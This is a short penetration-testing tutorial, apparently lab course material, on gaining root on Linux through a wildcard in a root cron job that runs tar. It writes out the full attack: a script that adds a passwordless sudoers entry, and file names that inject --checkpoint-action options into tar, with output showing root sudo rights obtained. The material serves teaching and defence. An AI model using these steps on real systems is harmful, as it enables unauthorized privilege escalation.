# Wildcard Abuse

---
# the tar * priv esc technique
An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:


```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the `/home/vipa0z` directory's contents and create a compressed archive within `/home/vipa0z`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/vipa0z && tar -zcf /home/vipa0z/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
vipa0z@NIX02:~$ echo 'echo "vipa0z ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
vipa0z@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
vipa0z@NIX02:~$ echo "" > --checkpoint=1
```

We can check and see that the necessary files were created.

Wildcard Abuse

```shell-session
vipa0z@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 vipa0z vipa0z    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 vipa0z vipa0z    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 vipa0z vipa0z   60 Aug 31 23:11 root.sh
```

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

Wildcard Abuse

```shell-session
vipa0z@NIX02:~$ sudo -l

Matching Defaults entries for vipa0z on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vipa0z may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```